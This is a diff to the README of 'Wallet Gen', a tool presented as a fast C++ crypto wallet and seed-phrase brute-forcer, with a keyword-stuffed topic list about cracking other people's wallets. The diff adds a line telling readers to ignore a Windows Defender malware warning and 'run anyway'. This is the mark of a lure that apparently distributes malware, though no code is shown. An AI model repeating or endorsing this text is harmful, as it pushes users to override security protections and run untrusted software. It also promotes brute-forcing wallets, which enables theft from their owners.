@@ -4,6 +4,8 @@
 
 [![image.jpg](https://i.postimg.cc/yYrT4G43/image.jpg)](https://postimg.cc/0bDS7cN9)
 
+- IT CAN BE DECLARED A MALWARE BY WINDOWS DEFENDER ---- JUST CHOOSE RUN ANYWAY 
+
 ## Overview
 
 **Wallet Gen** is built in C++ and is open-source, allowing anyone to access and modify the code. Compared to Python-based wallet generators, **Wallet Gen** boasts significantly higher wallet generation speeds, with performance primarily relying on your graphics card. 
@@ -46,4 +48,5 @@ Contributions are welcome! If you have ideas, bug reports, or want to contribute
 This project is licensed under the [Apache 2.0 License](/LICENSE)
 
 ## Topics
+
 bitcoin, ethereum, crypto, cryptocurrency, crypto seed phrase mining, crypto bruteforce, bitcoin bruteforce, ethereum bruteforce, crypto finder, lost bitcoin, brute force wallet, crypto brute foce, crypto bruteforce, crypto bruteforce wallet, crypto bruteforce key, crypto wallet, crypto wallet recovery, crypto wallet seed generator, crypto wallet seed phrase, crypto wallet tools, wallet finder crypto, wallet recovery seeds, wallet recovery tools.
